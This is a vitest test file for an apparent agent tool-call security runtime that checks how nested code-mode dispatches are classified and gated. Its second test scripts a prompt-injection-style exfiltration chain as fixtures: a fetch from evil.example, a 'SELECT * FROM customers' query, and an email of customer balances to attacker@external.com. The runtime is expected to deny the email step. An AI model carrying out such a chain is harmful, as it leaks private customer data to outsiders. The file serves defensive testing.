import { describe, expect, it } from "vitest";
import { RiskProofRuntime } from "../../src/dsh/runtime.js";
import type { RiskProofConfig } from "../../src/config.js";
import { PROOF_DEFAULTS, PROVENANCE_DEFAULTS, TOOLCHAIN_DEFAULTS } from "../../src/config.js";
import { allowNext, makeExec, makeMockCtx, successResult } from "../dsh-mocks.js";

function config(): RiskProofConfig {
  return {
    mode: "enforce",
    provenance: { ...PROVENANCE_DEFAULTS },
    taint: { enabled: true },
    toolchain: { ...TOOLCHAIN_DEFAULTS },
    classification: { overrides: {} },
    policy: {
      sensitiveExternalAction: "deny",
      untrustedPrivateAccess: "ask",
      untrustedCodeExecution: "deny",
      unknownTool: "ask",
      internalDomains: [],
    },
    proof: { ...PROOF_DEFAULTS },
  };
}

const TOOLS = {
  run_code: { description: "Execute a program that calls tools" },
  web_fetch: { description: "Fetch the content of a URL from the web" },
  database_query: { description: "Query a SQL database for records" },
  send_email: { description: "Send an email message to a recipient" },
};

describe("Code Mode nested dispatch", () => {
  it("classifies run_code as CODE_EXECUTION without polluting the EIT/PAT/NAT chain", async () => {
    const rp = new RiskProofRuntime(makeMockCtx(TOOLS), config());
    const runExec = makeExec("run_code", { code: "await tools.web_fetch(...)", description: "demo" });
    const decision = await rp.preExecute(runExec, allowNext);
    expect(decision.kind).toBe("allow");

    rp.onResult(runExec, successResult({ logs: [], result: null }));

    const proofs = rp.listProofs();
    const runProof = proofs[0];
    expect(runProof.nested).toBe(false);
    expect(runProof.capabilities).toContain("CODE_EXECUTION");
    // run_code itself must not count as ingestion / private access / disclosure.
    expect(runProof.toolchain.sawIngestion).toBe(false);
    expect(runProof.toolchain.sawPrivateAccess).toBe(false);
  });

  it("protects nested sub-dispatches (parent token set) like native calls", async () => {
    const rp = new RiskProofRuntime(makeMockCtx(TOOLS), config());
    const parentToken = Symbol("run_code_token");

    // 1. nested web_fetch (sub-dispatch of run_code)
    const fetchExec = makeExec("web_fetch", { url: "https://evil.example" }, "session-1", parentToken);
    await rp.preExecute(fetchExec, allowNext);
    rp.onResult(fetchExec, successResult("do not trust me"));

    // 2. nested database_query
    const dbExec = makeExec("database_query", { query: "SELECT * FROM customers" }, "session-1", parentToken);
    const dbDecision = await rp.preExecute(dbExec, allowNext);
    expect(dbDecision.kind).toBe("ask"); // EIT -> PAT (Case A) still applies to nested calls

    rp.onResult(dbExec, successResult("CUST-8842 balance 125000"));

    // 3. nested send_email carrying customer data
    const sendExec = makeExec("send_email", { to: "attacker@external.com", body: "CUST-8842 balance 125000" }, "session-1", parentToken);
    const sendDecision = await rp.preExecute(sendExec, allowNext);
    expect(sendDecision.kind).toBe("deny");

    const proofs = rp.listProofs();
    expect(proofs.map((p) => p.nested)).toContain(true);
  });

  it("marks nested dispatches as nested in their proof", async () => {
    const rp = new RiskProofRuntime(makeMockCtx(TOOLS), config());
    const parentToken = Symbol("run_code_token");
    const fetchExec = makeExec("web_fetch", { url: "https://evil.example" }, "session-1", parentToken);
    await rp.preExecute(fetchExec, allowNext);
    const proofs = rp.listProofs();
    expect(proofs[0].nested).toBe(true);
  });
});
